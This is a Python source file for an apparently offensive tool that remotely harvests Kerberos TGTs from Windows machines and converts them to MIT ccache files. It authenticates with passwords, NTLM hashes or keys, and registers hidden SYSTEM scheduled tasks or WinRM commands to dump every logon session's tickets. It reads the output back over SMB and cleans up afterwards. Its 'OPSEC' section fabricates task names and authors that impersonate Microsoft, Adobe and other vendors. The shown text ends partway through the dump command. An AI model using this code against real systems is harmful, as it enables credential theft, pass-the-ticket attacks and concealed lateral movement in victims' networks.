#!/usr/bin/env python3
"""Convert or remotely collect Windows Kerberos TGTs as MIT ccache files.

Remote collection supports Task Scheduler over SMB (the default) and WinRM:

  klist2ccache list [[domain/]username[:password]@]target [-M smb|winrm]
  klist2ccache dump [[domain/]username[:password]@]target [-M smb|winrm]

Existing ``klist tgt`` output can be converted locally:

  klist2ccache convert -i klist.txt
"""

from __future__ import print_function

import argparse
import base64
import logging
import os
import re
import struct
import random
import sys
import time
from datetime import datetime, timezone
from getpass import getpass

# Impacket
from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.dcerpc.v5 import transport, tsch
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import (
    RPC_C_AUTHN_GSS_NEGOTIATE,
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
)


__version__ = "0.2.0"


# ─── klist text parser ────────────────────────────────────────────────────────

def _parse_klist(text):
    """Parse output of `klist tgt [-li 0x...]` into a credential dict."""

    def field(pat, default=""):
        m = re.search(pat, text, re.IGNORECASE)
        return m.group(1).strip() if m else default

    def parse_time(s):
        if not s:
            return 0
        for fmt in ("%m/%d/%Y %H:%M:%S", "%m/%d/%Y %H:%M"):
            try:
                return int(
                    datetime.strptime(s.strip(), fmt)
                    .replace(tzinfo=timezone.utc)
                    .timestamp()
                )
            except ValueError:
                pass
        return 0

    ticket_hex = []
    for m in re.finditer(
        r"^[0-9a-fA-F]{4}\s+((?:[0-9a-fA-F]{2}[\s:])+)", text, re.MULTILINE
    ):
        ticket_hex.append(re.sub(r"[^0-9a-fA-F]", "", m.group(1)))
    ticket_bytes = bytes.fromhex("".join(ticket_hex)) if ticket_hex else b""

    # Kerberos key sizes (RFC 4120 + Windows etypes)
    _KEY_SIZES = {0x01: 8, 0x03: 8, 0x11: 16, 0x12: 32, 0x17: 16, 0x18: 16}

    key_type = int(field(r"KeyType\s+(0x[0-9a-fA-F]+)", "0x12"), 16)

    raw = re.sub(
        r"\s+",
        "",
        field(r"KeyLength\s+\d+\s+-\s+([0-9a-fA-F][0-9a-fA-F ]*)"),
    )
    try:
        raw_bytes = bytes.fromhex(raw) if raw else b""
    except ValueError:
        raw_bytes = b""

    # Credential Guard variant: the blob is a marshalled KerberosKeyWithMetadata
    # — self-size@0, typename-length@8, typename-offset@12 pointing at the literal
    # ASCII "KerberosKeyWithMetadata", key@28, then the typename + metadata tail.
    # Here offset 8 is NOT the etype, so fall back to the "KeyType 0x.." header.
    cred_guard = False
    key_bytes = b""
    if raw_bytes:
        if len(raw_bytes) >= 16 and struct.unpack_from("<I", raw_bytes, 0)[0] == len(raw_bytes):
            _TN = b"KerberosKeyWithMetadata"
            tn_len = struct.unpack_from("<I", raw_bytes, 8)[0]
            tn_off = struct.unpack_from("<I", raw_bytes, 12)[0]
            cred_guard = (
                tn_len == len(_TN)
                and 0 < tn_off <= len(raw_bytes) - len(_TN)
                and raw_bytes[tn_off:tn_off + len(_TN)] == _TN
            )
            # Non-CG SYSTEM blob: etype@8, cleartext key@28 — extract it.
            # CG blob: key material is wrapped/encrypted (protected in VTL1) and is
            # NOT recoverable offline, so do not treat offset-28 bytes as a key.
            if not cred_guard:
                etype_in_blob = struct.unpack_from("<I", raw_bytes, 8)[0]
                key_sz = _KEY_SIZES.get(etype_in_blob)
                if key_sz and len(raw_bytes) >= 28 + key_sz:
                    key_type = etype_in_blob
                    key_bytes = raw_bytes[28:28 + key_sz]
                    logging.debug("  Extracted %d-byte key (etype 0x%x) from metadata blob" % (key_sz, etype_in_blob))
        if not key_bytes:
            expected = _KEY_SIZES.get(key_type, 32)
            if len(raw_bytes) == expected:
                key_bytes = raw_bytes

    if not key_bytes:
        expected = _KEY_SIZES.get(key_type, 32)
        key_bytes = b"\x00" * expected
        logging.debug("  Session key unavailable; using %d zero bytes for etype 0x%x" % (expected, key_type))

    return {
        "client": field(r"ClientName\s*:\s*(.+)"),
        "realm": field(r"DomainName\s*:\s*(.+)"),
        "sname": [
            field(r"ServiceName\s*:\s*(.+)"),
            field(r"TargetDomainName\s*:\s*(.+)"),
        ],
        "flags": int(field(r"Ticket Flags\s*:\s*(0x[0-9a-fA-F]+)", "0x0"), 16),
        "key_type": key_type,
        "key_data": key_bytes,
        "cred_guard": cred_guard,
        "auth_time": parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "start_time": parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "end_time": parse_time(field(r"EndTime\s*:\s*(.+?)\s*\(local\)")),
        "renew_till": parse_time(field(r"RenewUntil\s*:\s*(.+?)\s*\(local\)")),
        "ticket_data": ticket_bytes,
    }


# ─── ccache writer (MIT credential cache v4) ─────────────────────────────────

def _write_ccache(info, path):
    def p16(n):
        return struct.pack(">H", n)

    def p32(n):
        return struct.pack(">I", n)

    def cnt(b):
        return p32(len(b)) + b

    def principal(name, realm, ntype=1):
        parts = name.split("/") if "/" in name else [name]
        out = p32(ntype) + p32(len(parts)) + cnt(realm.encode())
        for component in parts:
            out += cnt(component.encode())
        return out

    hdr = b"\x05\x04"
    tag = p16(1) + p16(8) + struct.pack(">I", 0xFFFFFFFF) + p32(0)
    hdr += p16(len(tag)) + tag

    default_p = principal(info["client"], info["realm"])
    cred = principal(info["client"], info["realm"])
    cred += principal("/".join(info["sname"]), info["realm"], 1)
    cred += p16(info["key_type"])
    cred += p16(0)
    cred += p16(len(info["key_data"])) + info["key_data"]
    cred += struct.pack(
        ">IIII",
        info["auth_time"],
        info["start_time"],
        info["end_time"],
        info["renew_till"],
    )
    cred += b"\x00"
    cred += p32(info["flags"])
    cred += p32(0)
    cred += p32(0)
    cred += cnt(info["ticket_data"])
    cred += cnt(b"")

    with open(path, "wb") as f:
        f.write(hdr + default_p + cred)
    return path


# ─── Session list parser ──────────────────────────────────────────────────────

# `klist sessions` reports the authentication package used to create the logon
# session, not every package which currently has credentials cached in it.  A
# session shown as `Negotiate:Service` can therefore contain a valid Kerberos
# TGT (the common examples are the 0x3e4 and 0x3e7 machine sessions).  Parse all
# logon sessions here; callers verify the cache with `klist tgt -li <LUID>`.
SESSION_LINE = re.compile(
    r"^\[\d+\]\s+Session\s+\d+\s+0:(0x[0-9a-fA-F]+)\s+(.+?)\s+\S+:\S+\s*$",
    re.IGNORECASE,
)


def _is_computer_account(account):
    """Return True for ``DOMAIN\\HOST$``-style machine accounts."""
    return account.rsplit("\\", 1)[-1].endswith("$")


def parse_klist_sessions(text, include_computer=True):
    """Extract candidate ``(logon_id_hex, account)`` entries.

    Authentication-package labels in ``klist sessions`` are not a reliable
    indication that a session has Kerberos credentials, so every package type
    is accepted.  Duplicate LUIDs are discarded while preserving order.
    """
    sessions = []
    seen = set()
    for line in text.splitlines():
        m = SESSION_LINE.search(line.strip())
        if not m:
            continue
        logon_hex = m.group(1).strip().lower()
        account = m.group(2).strip()
        if not logon_hex or not account or logon_hex in seen:
            continue
        if not include_computer and _is_computer_account(account):
            continue
        seen.add(logon_hex)
        sessions.append((logon_hex, account))
    return sessions


def _split_tgt_output(text, expected):
    """Split combined ``klist tgt`` output without losing empty results."""
    if text is None:
        return None
    parts = [part.strip() for part in text.split(OUTPUT_SEP)]
    if len(parts) < expected:
        parts.extend([""] * (expected - len(parts)))
    return parts[:expected]


def _sessions_with_tgts(sessions, tgt_texts, include_computer=True):
    """Return ``(luid, account, text, parsed_tgt)`` entries with real TGTs."""
    found = []
    if tgt_texts is None:
        return found
    for (logon_hex, account), tgt_text in zip(sessions, tgt_texts):
        if not include_computer and _is_computer_account(account):
            continue
        if not tgt_text:
            continue
        info = _parse_klist(tgt_text)
        if info["ticket_data"]:
            found.append((logon_hex, account, tgt_text, info))
    return found


# ─── OPSEC helpers ────────────────────────────────────────────────────────────

_PRODUCTS = [
    "Microsoft", "Windows", "Office", "Edge", "OneDrive", "Defender", "Teams",
    "Outlook", "SharePoint", "Visual", "Excel", "Word", "PowerPoint", "Azure",
    "Adobe", "Acrobat", "Reader", "Creative", "Premiere", "Illustrator",
    "Google", "Chrome", "Drive", "Workspace", "Gemini",
    "Intel", "NVIDIA", "AMD", "Realtek", "Qualcomm",
    "Dell", "HP", "Lenovo", "Asus", "Acer", "Samsung",
    "Zoom", "Slack", "Dropbox", "Spotify", "Discord",
    "Java", "Oracle", "Citrix", "VMware", "Firefox",
    "DirectX", "DotNet", "Runtime", "Framework", "Steam",
]

_DESCRIPTORS = [
    "Update", "Updater", "Installer", "Setup", "Agent",
    "Manager", "Service", "Helper", "Host", "Runner",
    "Worker", "Launcher", "Monitor", "Sync", "Backup",
    "Repair", "Scanner", "Checker", "Validator", "Notifier",
    "Reporter", "Collector", "Dispatcher", "Handler", "Processor",
    "Controller", "Loader", "Scheduler", "Cleaner", "Detector",
    "Optimizer", "Configurator", "Deployer", "Registrar", "Resolver",
]

_COMPANY_MAP = {
    "Microsoft": "Microsoft Corporation",
    "Windows":   "Microsoft Corporation",
    "Office":    "Microsoft Corporation",
    "Edge":      "Microsoft Corporation",
    "OneDrive":  "Microsoft Corporation",
    "Defender":  "Microsoft Corporation",
    "Teams":     "Microsoft Corporation",
    "Outlook":   "Microsoft Corporation",
    "SharePoint":"Microsoft Corporation",
    "Visual":    "Microsoft Corporation",
    "Excel":     "Microsoft Corporation",
    "Word":      "Microsoft Corporation",
    "PowerPoint":"Microsoft Corporation",
    "Azure":     "Microsoft Corporation",
    "DirectX":   "Microsoft Corporation",
    "DotNet":    "Microsoft Corporation",
    "Runtime":   "Microsoft Corporation",
    "Framework": "Microsoft Corporation",
    "Adobe":     "Adobe Inc.",
    "Acrobat":   "Adobe Inc.",
    "Reader":    "Adobe Inc.",
    "Creative":  "Adobe Inc.",
    "Premiere":  "Adobe Inc.",
    "Illustrator":"Adobe Inc.",
    "Google":    "Google LLC",
    "Chrome":    "Google LLC",
    "Drive":     "Google LLC",
    "Workspace": "Google LLC",
    "Gemini":    "Google LLC",
    "Intel":     "Intel Corporation",
    "NVIDIA":    "NVIDIA Corporation",
    "AMD":       "Advanced Micro Devices, Inc.",
    "Realtek":   "Realtek Semiconductor Corp.",
    "Qualcomm":  "Qualcomm Technologies, Inc.",
    "Dell":      "Dell Inc.",
    "HP":        "HP Inc.",
    "Lenovo":    "Lenovo Group Limited",
    "Asus":      "ASUSTeK Computer Inc.",
    "Acer":      "Acer Inc.",
    "Samsung":   "Samsung Electronics Co., Ltd.",
    "Zoom":      "Zoom Video Communications, Inc.",
    "Slack":     "Slack Technologies, LLC",
    "Dropbox":   "Dropbox, Inc.",
    "Spotify":   "Spotify AB",
    "Discord":   "Discord Inc.",
    "Java":      "Oracle Corporation",
    "Oracle":    "Oracle Corporation",
    "Citrix":    "Citrix Systems, Inc.",
    "VMware":    "VMware, Inc.",
    "Firefox":   "Mozilla Foundation",
    "Steam":     "Valve Corporation",
}

_DESCRIPTION_TEMPLATES = [
    "{p} {d} component for system maintenance.",
    "Manages {p} {d} operations on this device.",
    "Handles {p} background {d} tasks.",
    "Ensures {p} {d} runs correctly on this machine.",
    "Responsible for {p} {d} and system integration.",
    "{p} {d} service for optimal performance.",
    "Performs scheduled {p} {d} routines.",
    "Maintains {p} installation and {d} state.",
    "Keeps {p} {d} current and functional.",
    "Provides {p} {d} support for end users.",
]

_TASK_PATTERNS = [
    "{p}{d}",
    "{p}{d}Task",
    "{p}{d}Core",
    "{p}_{d}",
    "{p}{d}Machine",
    "{p}{d}UA",
]

_FILE_EXTENSIONS = [".log", ".dat", ".bin", ".cache", ".etl", ".db"]

_FILE_PATTERNS = [
    "{p}{d}_{n}{e}",
    "{p}_{d}{e}",
    "{p}{d}{e}",
    "{p}_{d}_{n}{e}",
    "{p}{d}Setup_{n}{e}",
]

_PIPE_PATTERNS = [
    "{p}{d}",
    "{p}_{d}",
    "{p}{d}Svc",
    "{p}{d}Pipe",
    "{p}{d}Ch",
]


def _leet_names(use_pipes=False, product=None):
    """Pick one (product, descriptor) pair and return OPSEC-safe names."""
    p = product if product is not None else random.choice(_PRODUCTS)
    d = random.choice(_DESCRIPTORS)
    task_author = _COMPANY_MAP.get(p, "Microsoft Corporation")
    task_desc   = random.choice(_DESCRIPTION_TEMPLATES).format(p=p, d=d)
    task_name   = random.choice(_TASK_PATTERNS).format(p=p, d=d)
    if use_pipes:
        pipe_name = random.choice(_PIPE_PATTERNS).format(p=p, d=d)
        return task_name, task_author, task_desc, pipe_name
    n = random.randint(1000, 99999)
    e = random.choice(_FILE_EXTENSIONS)
    file_name = random.choice(_FILE_PATTERNS).format(p=p, d=d, n=n, e=e)
    return task_name, task_author, task_desc, file_name


TASK_START_BOUNDARY = "2015-07-15T20:35:13.2757294"
PIPE_EOF_SENTINEL   = "<#KEOF#>"
OUTPUT_SEP          = "KLISTSEP"


# ─── Task XML builder ─────────────────────────────────────────────────────────

def _xml_escape(data):
    replace_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    return "".join(replace_table.get(c, c) for c in data)


def _task_xml(author, desc, command, arguments, time_limit="PT1M"):
    return """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>%s</Author>
    <Description>%s</Description>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>%s</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>%s</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
""" % (
    _xml_escape(author), _xml_escape(desc), TASK_START_BOUNDARY,
    time_limit, _xml_escape(command), _xml_escape(arguments),
)


# ─── Remote execution via Task Scheduler + cmd.exe (file output) ─────────────

def run_remote_cmd_and_read_output(smb, dce, command, max_wait=60, retries=20, product=None):
    """
    Run `command` on target via Task Scheduler using cmd.exe.
    Output is written to C:\\ProgramData\\<file>, read via C$, then deleted.
    Returns decoded string content, or None on failure.
    """
    task_name, task_author, task_desc, temp_basename = _leet_names(product=product)
    logging.info("  task: \\%s  file: %s" % (task_name, temp_basename))

    args = '/c "' + command + ' > C:\\ProgramData\\' + temp_basename + '"'
    xml = _task_xml(task_author, task_desc, "cmd.exe", args, time_limit="PT1M")

    try:
        tsch.hSchRpcRegisterTask(dce, "\\" + task_name, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        tsch.hSchRpcRun(dce, "\\" + task_name)
    except Exception as e:
        logging.error("Task create/run failed: %s" % e)
        try:
            tsch.hSchRpcDelete(dce, "\\" + task_name)
        except Exception:
            pass
        return None

    deadline = time.time() + max_wait
    done = False
    while time.time() < deadline and not done:
        try:
            resp = tsch.hSchRpcGetLastRunInfo(dce, "\\" + task_name)
            if resp["pLastRuntime"]["wYear"] != 0:
                done = True
                break
        except Exception:
            pass
        time.sleep(2)

    try:
        tsch.hSchRpcDelete(dce, "\\" + task_name)
    except Exception:
        pass

    if not done:
        logging.error("Task did not complete in time")
        return None

    time.sleep(2)

    smb_share = "C$"
    smb_path = "ProgramData\\" + temp_basename
    result = None
    for attempt in range(retries):
        try:
            data = []
            smb.getFile(smb_share, smb_path, lambda d, off=0: data.append(d))
            result = b"".join(data).decode("utf-8", errors="replace")
            break
        except Exception as e:
            if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e) or "0xc0000034" in str(e):
                if attempt < retries - 1:
                    time.sleep(3)
                    continue
            logging.error("Failed to read %s: %s" % (smb_path, e))
            return None

    if result is not None:
        try:
            smb.deleteFile(smb_share, smb_path)
        except Exception as e:
            logging.debug("Could not delete remote file %s: %s" % (smb_path, e))

    return result


# ─── Remote execution via Task Scheduler + PowerShell named pipe ──────────────

def _run_ps_via_pipe(smb, dce, ps_body, max_wait=90, pipe_timeout=45):
    """
    Run PowerShell via Task Scheduler + named pipe over SMB IPC$.
    ps_body is PS code with access to $w (StreamWriter). EOF sentinel is appended automatically.
    Returns raw output string (before EOF sentinel), or None on failure.
    """
    task_name, task_author, task_desc, pipe_name = _leet_names(use_pipes=True)
    logging.info("  task: \\%s  pipe: \\pipe\\%s" % (task_name, pipe_name))

    ps_cmd = (
        "$n='{pipe}';"
        "$p=New-Object System.IO.Pipes.NamedPipeServerStream"
        "($n,[System.IO.Pipes.PipeDirection]::InOut,1,"
        "[System.IO.Pipes.PipeTransmissionMode]::Byte,"
        "[System.IO.Pipes.PipeOptions]::None,65536,65536);"
        "$p.WaitForConnection();"
        "$w=New-Object System.IO.StreamWriter($p);"
        "$w.AutoFlush=$true;"
        "{body}"
        "$w.WriteLine('{eof}');"
        "$w.Flush();"
        "$w.Close();"
        "$p.Disconnect();"
        "$p.Close()"
    ).format(pipe=pipe_name, body=ps_body, eof=PIPE_EOF_SENTINEL)

    ps_b64  = base64.b64encode(ps_cmd.encode("utf-16-le")).decode("ascii")
    ps_args = "-NonInteractive -NoProfile -EncodedCommand " + ps_b64
    xml = _task_xml(task_author, task_desc, "powershell.exe", ps_args, time_limit="PT2M")

    try:
        tsch.hSchRpcRegisterTask(dce, "\\" + task_name, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        tsch.hSchRpcRun(dce, "\\" + task_name)
    except Exception as e:
        logging.error("Task create/run failed: %s" % e)
        try:
            tsch.hSchRpcDelete(dce, "\\" + task_name)
        except Exception:
            pass
        return None

    try:
        tid = smb.connectTree("IPC$")
    except Exception as e:
        logging.error("IPC$ connect failed: %s" % e)
        try:
            tsch.hSchRpcDelete(dce, "\\" + task_name)
        except Exception:
            pass
        return None

    deadline = time.time() + pipe_timeout
    fid = None
    while time.time() < deadline:
        try:
            fid = smb.openFile(tid, "\\" + pipe_name)
            logging.debug("Opened pipe \\pipe\\%s" % pipe_name)
            break
        except Exception:
            time.sleep(0.5)

    if fid is None:
        logging.error("Timed out waiting for pipe \\pipe\\%s" % pipe_name)
        try:
            smb.disconnectTree(tid)
        except Exception:
            pass
        try:
            tsch.hSchRpcDelete(dce, "\\" + task_name)
        except Exception:
            pass
        return None

    chunks = []
    found_eof = False
    while not found_eof:
        try:
            data = smb.readFile(tid, fid, bytesToRead=65535)
            if not data:
                break
            chunks.append(data)
            if PIPE_EOF_SENTINEL.encode() in b"".join(chunks):
                found_eof = True
        except Exception:
            break

    try:
        smb.closeFile(tid, fid)
    except Exception:
        pass
    try:
        smb.disconnectTree(tid)
    except Exception:
        pass

    deadline2 = time.time() + max_wait
    while time.time() < deadline2:
        try:
            resp = tsch.hSchRpcGetLastRunInfo(dce, "\\" + task_name)
            if resp["pLastRuntime"]["wYear"] != 0:
                break
        except Exception:
            pass
        time.sleep(1)

    try:
        tsch.hSchRpcDelete(dce, "\\" + task_name)
    except Exception:
        pass

    if not chunks:
        logging.error("No data received from pipe \\pipe\\%s" % pipe_name)
        return None

    result = b"".join(chunks).decode("utf-8", errors="replace")
    if PIPE_EOF_SENTINEL in result:
        result = result[: result.index(PIPE_EOF_SENTINEL)]
    return result.strip() or None


# ─── Higher-level session/TGT helpers ────────────────────────────────────────

def _get_tgts_via_file(smb, dce, sessions, product=None):
    """Probe all candidate LUIDs for a TGT in one file-backed task."""
    if not sessions:
        return []
    commands = ["klist tgt -li %s" % logon_hex for logon_hex, _ in sessions]
    if len(commands) == 1:
        combined_command = commands[0]
    else:
        separator = " & echo %s & " % OUTPUT_SEP
        combined_command = "(" + separator.join(commands) + ")"
    logging.info("Checking %d logon session(s) for TGTs in one task ..." % len(sessions))
    output = run_remote_cmd_and_read_output(smb, dce, combined_command, product=product)
    return _split_tgt_output(output, len(sessions))


def _get_sessions_and_tgts_via_pipe(smb, dce):
    """
    Single PS task: enumerate sessions and dump all TGTs.
    Returns (sessions_text, [tgt_text, ...]) — one tgt_text per session in order.
    Returns (None, None) on failure.
    """
    ps_body = (
        "$sep='{sep}';"
        "$sess=(klist sessions|Out-String).Trim();"
        "$w.WriteLine($sess);"
        "$w.WriteLine($sep);"
        "$lines=$sess-split\"`n\"|?{{$_-match'^\\s*\\[\\d+\\]\\s+Session\\s+\\d+\\s+0:0x[0-9a-fA-F]+'}};"
        "$ids=$lines|%{{if($_-match'0:(0x[0-9a-fA-F]+)'){{$Matches[1]}}}}|?{{$_}}|Select-Object -Unique;"
        "foreach($id in $ids){{$t=(klist tgt -li $id|Out-String).Trim();$w.WriteLine($t);$w.WriteLine($sep)}};"
    ).format(sep=OUTPUT_SEP)

    raw = _run_ps_via_pipe(smb, dce, ps_body)
    if raw is None:
        return None, None

    parts = raw.split(OUTPUT_SEP)
    sessions_text = parts[0].strip() if parts else ""
    session_count = len(parse_klist_sessions(sessions_text))
    tgt_texts = [part.strip() for part in parts[1:1 + session_count]]
    if len(tgt_texts) < session_count:
        tgt_texts.extend([""] * (session_count - len(tgt_texts)))
    return sessions_text, tgt_texts


# ─── Command-line arguments ──────────────────────────────────────────────────

def _add_remote_args(parser):
    parser.add_argument(
        "-M",
        "--method",
        choices=("smb", "winrm"),
        default=argparse.SUPPRESS,
        help="Remote execution method (default: smb)",
    )
    parser.add_argument("-ts", action="store_true", help="Add timestamps to log output")
    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output on")
    parser.add_argument(
        "-named-pipes",
        "--named-pipes",
        action="store_true",
        help="Use a PowerShell named pipe for SMB output instead of a temporary file",
    )

    connection = parser.add_argument_group("WinRM connection")
    connection.add_argument(
        "-port",
        type=int,
        default=None,
        metavar="PORT",
        help="WinRM port (default: 5985 for HTTP or 5986 for HTTPS)",
    )
    connection.add_argument("-ssl", action="store_true", help="Use WinRM over HTTPS")

    session_filter = parser.add_mutually_exclusive_group()
    session_filter.add_argument(
        "--computer",
        dest="include_computer",
        action="store_true",
        default=True,
        help="Include computer-account TGTs (default; retained for compatibility)",
    )
    session_filter.add_argument(
        "--users-only",
        dest="include_computer",
        action="store_false",
        help="Exclude computer-account TGTs",
    )

    authentication = parser.add_argument_group("authentication")
    authentication.add_argument(
        "-hashes",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes; WinRM pass-the-hash requires requests-ntlm2",
    )
    authentication.add_argument(
        "-no-pass",
        action="store_true",
        help="Do not ask for a password (useful with -k)",
    )
    authentication.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication and credentials from KRB5CCNAME",
    )
    authentication.add_argument(
        "-aesKey",
        metavar="hex key",
        help="AES key for Kerberos authentication (128 or 256 bits)",
    )
    authentication.add_argument(
        "-dc-ip",
        metavar="ip address",
        help="Domain controller IP address",
    )
    authentication.add_argument("-keytab", help="Read keys for the SPN from a keytab file")


# ─── Authentication and transports ───────────────────────────────────────────

def _resolve_creds(args):
    domain, username, password, address = parse_target(args.target)
    domain = domain or ""

    if args.keytab is not None:
        from impacket.krb5.keytab import Keytab
        Keytab.loadKeysFromKeytab(args.keytab, username, domain, args)
        args.k = True

    if args.aesKey is not None:
        args.k = True

    if (
        password == ""
        and username != ""
        and args.hashes is None
        and not args.no_pass
        and args.aesKey is None
    ):
        password = getpass("Password:")

    lmhash = ""
    nthash = ""
    if args.hashes:
        try:
            lmhash, nthash = args.hashes.split(":", 1)
        except ValueError:
            logging.error("-hashes must use LMHASH:NTHASH format")
            sys.exit(1)

    return domain, username, password, address, lmhash, nthash


def _connect_smb(args, domain, username, password, address, lmhash, nthash):
    stringbinding = r"ncacn_np:%s[\pipe\atsvc]" % address
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    if hasattr(rpctransport, "set_credentials"):
        rpctransport.set_credentials(
            username,
            password,
            domain,
            lmhash,
            nthash,
            args.aesKey,
        )
        rpctransport.set_kerberos(args.k, args.dc_ip)

    try:
        dce = rpctransport.get_dce_rpc()
        dce.set_credentials(*rpctransport.get_credentials())
        if args.k:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
    except Exception as exc:
        logging.error("Task Scheduler connect/bind failed: %s" % exc)
        sys.exit(1)

    return dce, rpctransport.get_smb_connection()


def _connect_winrm(args, domain, username, password, address, lmhash, nthash):
    try:
        import winrm
    except ImportError:
        logging.error(
            "WinRM support requires pywinrm "
            "(reinstall klist2ccache with its dependencies)"
        )
        sys.exit(1)

    port = args.port if args.port is not None else (5986 if args.ssl else 5985)
    endpoint = "%s://%s:%d/wsman" % (
        "https" if args.ssl else "http",
        address,
        port,
    )
    user = "%s\\%s" % (domain, username) if domain else username

    if args.k:
        winrm_transport = "kerberos"
        passwd = password or ""
    elif nthash:
        winrm_transport = "ntlm"
        passwd = "%s:%s" % (
            lmhash or "00000000000000000000000000000000",
            nthash,
        )
    else:
        winrm_transport = "ntlm"
        passwd = password

    logging.info("Connecting to %s (%s transport) ..." % (endpoint, winrm_transport))
    try:
        session = winrm.Session(
            endpoint,
            auth=(user, passwd),
            transport=winrm_transport,
            server_cert_validation="ignore",
        )
        response = session.run_cmd("echo", ["ok"])
        if response.status_code != 0:
            stderr = response.std_err.decode("utf-8", errors="replace").strip()
            raise RuntimeError(
                "probe failed (exit %d): %s" % (response.status_code, stderr)
            )
    except Exception as exc:
        logging.error("WinRM connect failed: %s" % exc)
        sys.exit(1)

    return session


def _run_winrm_cmd(session, command):
    """Run a command through WinRM and return decoded stdout."""
    response = session.run_cmd(command)
    stderr = response.std_err.decode("utf-8", errors="replace").strip()
    if stderr:
        logging.debug("  stderr: %s" % stderr)
    if response.status_code != 0 and not response.std_out:
        logging.debug(
            "Command failed (exit %d): %s" % (response.status_code, stderr)
        )
        return None
    return response.std_out.decode("utf-8", errors="replace")


def _collect_remote_tgts(args, product=None):
    """Return (address, sessions_with_tgts) through the selected transport."""
    domain, username, password, address, lmhash, nthash = _resolve_creds(args)

    if args.method == "winrm":
        session = _connect_winrm(
            args,
            domain,
            username,
            password,
            address,
            lmhash,
            nthash,
        )
        logging.info("Enumerating remote logon sessions ...")
        sessions_text = _run_winrm_cmd(session, "klist sessions")
        sessions = (
            parse_klist_sessions(sessions_text)
            if sessions_text is not None
            else None
        )
        if args.debug and sessions_text is not None:
            print(sessions_text)
        if sessions is None:
            sys.exit(1)

        logging.info(
            "Checking %d logon session(s) for TGTs via WinRM ..." % len(sessions)
        )
        tgt_texts = []
        for logon_hex, _account in sessions:
            tgt_texts.append(
                _run_winrm_cmd(session, "klist tgt -li %s" % logon_hex) or ""
            )
    else:
        logging.info("Connecting to %s ..." % address)
        dce, smb = _connect_smb(
            args,
            domain,
            username,
            password,
            address,
            lmhash,
            nthash,
        )
        try:
            if args.named_pipes:
                logging.info(
                    "Enumerating logon sessions and checking TGT caches "
                    "(single pipe) ..."
                )
                sessions_text, tgt_texts = _get_sessions_and_tgts_via_pipe(
                    smb,
                    dce,
                )
                sessions = (
                    parse_klist_sessions(sessions_text)
                    if sessions_text is not None
                    else None
                )
                if args.debug and sessions_text is not None:
                    print(sessions_text)
            else:
                logging.info("Enumerating remote logon sessions ...")
                sessions_text = run_remote_cmd_and_read_output(
                    smb,
                    dce,
                    "klist sessions",
                    product=product,
                )
                sessions = (
                    parse_klist_sessions(sessions_text)
                    if sessions_text is not None
                    else None
                )
                if args.debug and sessions_text is not None:
                    print(sessions_text)
                tgt_texts = (
                    _get_tgts_via_file(
                        smb,
                        dce,
                        sessions,
                        product=product,
                    )
                    if sessions is not None
                    else None
                )
        finally:
            dce.disconnect()

    if sessions is None or tgt_texts is None:
        sys.exit(1)

    return address, _sessions_with_tgts(
        sessions,
        tgt_texts,
        include_computer=args.include_computer,
    )


# ─── Remote commands ─────────────────────────────────────────────────────────

def cmd_list(args):
    address, tgt_sessions = _collect_remote_tgts(args)
    if not tgt_sessions:
        logging.warning("No logon sessions with a Kerberos TGT found")
        return 0

    print()
    print("  Kerberos sessions on %s:\n" % address)
    width = max(len(account) for _, account, _, _ in tgt_sessions)
    for index, (logon_hex, account, _, _) in enumerate(tgt_sessions, 1):
        print("  [%d]  %-*s  %s" % (index, width, account, logon_hex))
    print()
    return 0


def cmd_dump(args):
    os.makedirs(args.output_dir, exist_ok=True)
    product = None
    if args.method == "smb" and not args.named_pipes:
        product = random.choice(_PRODUCTS)
    _address, tgt_sessions = _collect_remote_tgts(args, product=product)

    if not tgt_sessions:
        logging.warning("No logon sessions with a Kerberos TGT found")
        return 0

    if args.session is not None:
        if args.session < 1 or args.session > len(tgt_sessions):
            logging.error(
                "Session %d out of range (1-%d). "
                "Use 'list' to see available sessions."
                % (args.session, len(tgt_sessions))
            )
            return 1
        to_dump = [tgt_sessions[args.session - 1]]
    else:
        to_dump = tgt_sessions

    width = max(len(account) for _, account, _, _ in to_dump)
    print()
